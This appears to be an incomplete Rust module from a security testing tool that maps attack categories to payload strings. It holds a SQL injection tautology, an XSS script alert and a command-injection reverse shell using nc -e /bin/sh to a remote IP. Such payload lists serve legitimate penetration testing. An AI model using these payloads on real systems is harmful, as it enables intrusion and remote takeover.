#[derive(Debug, Clone)]
pub enum PayloadCategory {
    All,
    LFI,
    SSRF,
    PathTraversal,
    SQLi,
    XSS,
    RCE,
}

pub fn get_payloads(category: PayloadCategory) -> Vec<String> {
    match category {
        PayloadCategory::SQLi => vec!["' OR 1=1--".to_string()],
        PayloadCategory::XSS => vec!["<script>alert(1)</script>".to_string()],
        PayloadCategory::RCE => vec!["; nc -e /bin/sh 10.0.0.1 4444".to_string()],
        _ => todo!(),
    }
}